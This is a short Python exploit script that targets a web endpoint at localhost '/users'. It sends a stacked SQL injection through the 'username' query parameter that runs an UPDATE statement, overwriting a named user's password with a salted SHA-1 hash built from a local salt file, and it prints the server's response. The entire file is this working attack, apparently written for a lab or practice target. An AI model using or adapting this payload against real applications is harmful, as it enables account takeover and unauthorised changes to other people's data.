import requests
import hashlib


BASE_URL = "http://localhost:8080/users"

def change_password(user, password_hash):
    payload = f"{user}'; UPDATE users SET password='{hash}' WHERE user_name='{user}';-- "

    print("[+] Sending stacked SQL injection payload...")
    resp = requests.get(BASE_URL, params={"username": payload})

    print("Status:", resp.status_code)
    print("Response:", resp.text)

    print(f"Update script ran: UPDATE users SET password='{hash}' WHERE user_name='{user}';")

def get_salt():
    with open("salt.txt", "r") as file:
        salt_value = file.read()

    return salt_value

def sha1_hash(salt, password):
    h = hashlib.sha1()
    h.update((salt + password).encode())

    print("Password hash: " + h.hexdigest())
    return h.hexdigest()


if __name__ == '__main__':
    user = "kakha1"
    salt = get_salt()
    password = "kakhaPassword"
    hash = sha1_hash(salt, password)

    change_password(user, hash)
